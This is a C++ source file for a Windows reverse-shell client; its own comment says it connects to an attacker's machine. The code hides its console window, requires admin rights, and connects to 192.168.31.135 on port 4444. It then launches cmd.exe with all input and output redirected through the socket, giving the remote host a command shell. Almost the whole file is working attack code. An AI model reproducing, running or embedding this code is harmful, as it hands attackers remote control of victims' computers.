// client.cpp
// this code will try to connect to attacker's machine

#include "client.h"
#include "server.h"

bool isAdmin() { // check is program running with admin rights
    bool isElevated = false;
    HANDLE token;
    TOKEN_ELEVATION elev;
    DWORD size;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &size)) {
            isElevated = elev.TokenIsElevated;
        }
    }
    if (token) {
        CloseHandle(token);
        token = NULL;
    }
    return isElevated;
}

int Client::connect(short port, char *ip) {
    FreeConsole(); // hide console window

    if (!isAdmin()) {
        MessageBox(NULL, "Run this as administrator!", "Fatal error", MB_ICONERROR | MB_OK);
        return -1;
    }

    // init socket lib
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // create socket
    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip);

    // connect to remote host
    if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) != 0) {
        MessageBox(NULL, "Failed to connect!", "Fatal error", MB_ICONERROR | MB_OK);
        return -1;
    }

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

    // start cmd.exe with redirected streams
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
    exit(0);
}

int main() 
{
    Client main_client;
    main_client.connect(4444, "192.168.31.135");

    return 0;
}